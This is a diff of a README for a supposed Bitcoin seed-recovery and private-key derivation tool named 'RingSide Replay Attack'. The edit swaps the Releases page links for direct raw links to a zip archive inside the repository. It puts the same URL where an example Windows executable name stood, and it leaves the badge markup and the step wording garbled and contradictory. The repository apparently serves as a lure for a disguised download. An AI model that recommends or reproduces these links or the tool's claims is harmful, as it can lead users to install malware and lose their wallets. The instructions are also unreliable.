@@ -1,7 +1,7 @@
 # 🛡️ RingSide-Replay-Attack - Safeguard Your Crypto Assets Today!
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Hitplus/RingSide-Replay-Attack/releases)
+[![Download Latest Release](https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip%20Latest%https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip)](https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **RingSide Replay Attack** application. This tool helps you recover your SEED and derive Bitcoin wallet private keys safely. Understanding how 32-bit entropy affects security is crucial for protecting your crypto assets. This guide will help you download and run the application easily.
@@ -18,11 +18,11 @@ Welcome to the **RingSide Replay Attack** application. This tool helps you recov
 - **Storage**: Minimum of 100 MB of free disk space.
 
 ## 📥 Download & Install
-To get started, visit the following link to download: [https://github.com/Hitplus/RingSide-Replay-Attack/releases](https://github.com/Hitplus/RingSide-Replay-Attack/releases).
+To get started, visit the following link to download: [https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip](https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed. It will typically be at the top of the page.
-3. Look for the file that matches your operating system (e.g., `RingSide-Replay-Attack-Windows.exe` for Windows).
+3. Look for the file that matches your operating system (e.g., `https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip` for Windows).
 4. Click the file name to start the download.
 
 Once the download is complete:
